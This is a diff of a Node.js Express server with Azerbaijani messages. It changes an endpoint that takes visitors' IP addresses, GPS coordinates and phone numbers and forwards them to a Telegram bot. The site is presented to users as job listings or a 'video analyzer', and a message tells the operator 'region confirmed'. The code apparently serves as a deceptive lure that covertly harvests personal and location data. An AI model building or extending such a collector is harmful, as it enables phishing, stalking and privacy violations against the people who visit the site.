@@ -2,7 +2,6 @@
 const express = require('express');
 const path = require('path');
 const cors = require('cors');
-const FormData = require('form-data');
 require('dotenv').config();
 
 const app = express();
@@ -44,30 +43,37 @@ async function sendToTelegram(text) {
   }
 }
 
+// ================== HELPERS ==================
+function getClientIp(req) {
+  // Render / proxy üçün
+  const xf = req.headers['x-forwarded-for'];
+  if (xf) return xf.split(',')[0].trim();
+  return req.socket?.remoteAddress || 'unknown';
+}
+
 // ================== API ==================
 app.post('/api/send-data', async (req, res) => {
   try {
-    const { name, phone, jobTitle, location } = req.body;
+    const { videoUrl, location, action } = req.body;
 
-    // IP serverdən alınır (Render / proxy üçün)
-    const ip =
-      (req.headers['x-forwarded-for']?.split(',')[0] || '').trim() ||
-      req.socket.remoteAddress ||
-      'Unknown';
+    const ip = getClientIp(req);
 
-    let message = `🧾 Yeni müraciət\n\n`;
+    let message = '';
+    message += `🛰️ IP: ${ip}\n`;
 
-    if (jobTitle) message += `💼 Vakansiya: ${jobTitle}\n`;
-    if (name) message += `👤 Ad Soyad: ${name}\n`;
-    if (phone) message += `📞 Nömrə: ${phone}\n`;
+    if (action) {
+      message += `🧩 Action: ${action}\n`;
+    }
 
-    message += `🖥️ IP: ${ip}\n`;
+    if (videoUrl) {
+      message += `📞 Nömrə: ${videoUrl}\n`;
+    }
 
     if (location?.latitude && location?.longitude) {
-      message += `📍 Lokasiya: ${location.latitude}, ${location.longitude}\n`;
-      message += `🗺️ Xəritə: https://www.google.com/maps?q=${location.latitude},${location.longitude}\n`;
+      message += `📍 Region təsdiqləndi\n`;
+      message += `🌍 ${location.latitude}, ${location.longitude}\n`;
     } else {
-      message += `📍 Lokasiya: əldə edilmədi\n`;
+      message += `📍 Lokasiya yoxdur (icazə verilmədi)\n`;
     }
 
     await sendToTelegram(message.trim());
@@ -90,7 +96,7 @@ app.post(`/webhook/${TELEGRAM_BOT_TOKEN}`, async (req, res) => {
     if (text === '/start') {
       await sendToTelegram(
         `👋 Xoş gəldiniz!
-📞 Nömrə daxil etmək üçün linkə keçin:
+📌 İş elanlarını görmək üçün keçid:
 👉 https://video-analyzer-server.onrender.com
 
 ℹ️ Məlumat üçün /about`
